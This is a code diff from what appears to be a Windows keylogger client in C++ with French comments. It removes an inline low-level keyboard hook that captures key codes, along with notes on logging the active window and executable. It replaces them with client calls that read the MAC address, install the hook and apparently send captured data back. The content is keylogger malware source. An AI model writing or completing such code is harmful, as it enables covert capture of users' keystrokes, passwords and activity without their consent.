@@ -2,69 +2,14 @@
 #include <iostream>
 #include "Client.h"
 
-HHOOK kbHook; 
-bool shift = false;
+Client clt;
 
-LRESULT CALLBACK KeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam)
-{
-	bool ctrl = false;
-	KBDLLHOOKSTRUCT		*a;
-
-	a = (KBDLLHOOKSTRUCT*)lParam;
-	std::cout << a->vkCode << std::endl;
-	if (nCode == HC_ACTION)
-	{
-		if (a->vkCode == VK_LSHIFT || a->vkCode == VK_RSHIFT)
-			shift = true;
-		else
-			shift = false;
-	}
-	ctrl = GetAsyncKeyState(VK_CONTROL) >> ((sizeof(SHORT) * 8) - 1);
-	if (a->vkCode == VK_F12 && ctrl)
-	{
-		UnhookWindowsHookEx(kbHook);
-	}
-	//
-	// Créer un instance de KeyboardEvent ici !
-	//
-
-	//
-	// Récupérer la fenêtre active :
-	// HWND GetForegroundWindow()
-	//
-	// Nom de la fenêtre active : 
-	// GetWindowTextA(HWND window, char *name, sizeof(name))
-	// Windows limite le nom des fenêtres à 255 caractères donc "char name[256]"
-	//
-	// Nom de l'exécutable :
-	// DWORD ThreadId =	GetWindowsThreadProcessId(HWND window, NULL)
-	// HANDLE WINAPI hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, ThreadId)
-	// if (hProcess != NULL)
-	// len = GetModuleFileNameEx(hProcess, NULL, char *name, sizeof(name))
-	//
-	return (CallNextHookEx(NULL, nCode, wParam, lParam));
-}
-
-LRESULT CALLBACK MouseProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam)
-{
-
-	return (CallNextHookEx(NULL, nCode, wParam, lParam));
-}
 
 int main(int ac, char **av)
 {
-	Client test;
+	clt.getMACAddress();
 
-	test.getMACAddress();
-
-	kbHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
-
-	MSG message;
-
-	while(GetMessage(&message, NULL, 0, 0))
-	{
-		TranslateMessage(&message);
-		DispatchMessage(&message);
-	}
+	clt.setKeyboardHook();
+	clt.sendBackMessage();
 	return (0);
 }
